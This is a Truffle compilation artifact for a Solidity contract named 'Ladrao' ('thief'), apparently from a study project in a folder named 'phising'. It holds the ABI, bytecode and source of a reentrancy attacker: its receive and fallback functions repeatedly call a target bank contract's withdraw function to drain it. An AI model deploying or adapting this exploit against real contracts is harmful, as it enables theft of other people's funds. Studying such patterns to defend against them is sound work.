{
  "contractName": "Ladrao",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_endereco_alvo",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "Sacar",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "Roubar",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103393803806103398339818101604052810190610032919061011c565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b6101e1806101586000396000f3fe6080604052600436106100385760003560e01c80636615d65b146100515780638da5cb5b14610068578063fd2161631461009357610047565b366100475761004561009d565b005b61004f61009d565b005b34801561005d57600080fd5b5061006661009d565b005b34801561007457600080fd5b5061007d6100a7565b60405161008a9190610190565b60405180910390f35b61009b6100cb565b005b6100a56100cb565b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fd2161636040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061017a8261014f565b9050919050565b61018a8161016f565b82525050565b60006020820190506101a56000830184610181565b9291505056fea2646970667358221220e179d83cf87e987675a746856ee49e7537cab1e64545895ee04536721c75cca364736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\ninterface Banco {\n    function Sacar() external payable;\n}\n\ncontract Ladrao {\n    address public owner;\n\n    Banco banco;\n\n    constructor(address _endereco_alvo) {\n        banco = Banco(_endereco_alvo);\n        owner = msg.sender;\n    }\n\n    function Sacar() public payable {\n        return banco.Sacar();\n    }\n\n    function Roubar() public {\n        Sacar();\n    }\n\n    receive() external payable {\n        Roubar();\n    }\n\n    fallback() external payable {\n        Roubar();\n    }\n}\n",
  "sourcePath": "/home/mont/Desktop/phising/contracts/Ladrao.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2022-09-26T19:38:09.337Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}